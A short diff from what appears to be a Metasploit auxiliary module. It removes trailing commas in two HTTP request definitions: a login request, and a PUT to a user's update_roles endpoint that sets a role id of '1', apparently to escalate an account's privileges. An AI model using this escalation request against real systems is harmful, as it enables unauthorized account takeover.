@@ -47,7 +47,7 @@ class Metasploit4 < Msf::Auxiliary
       'vars_get' => {
         'username' => datastore['USERNAME'],
         'password' => datastore['PASSWORD']
-      },
+      }
     )
 
     if res.nil?
@@ -120,7 +120,7 @@ class Metasploit4 < Msf::Auxiliary
       'method'    => 'PUT',
       'uri'       => normalize_uri(target_uri.path, 'users', user, 'update_roles'),
       'vars_post' => {
-        'user[role_ids][]' => '1',
+        'user[role_ids][]' => '1'
       }
     )
 
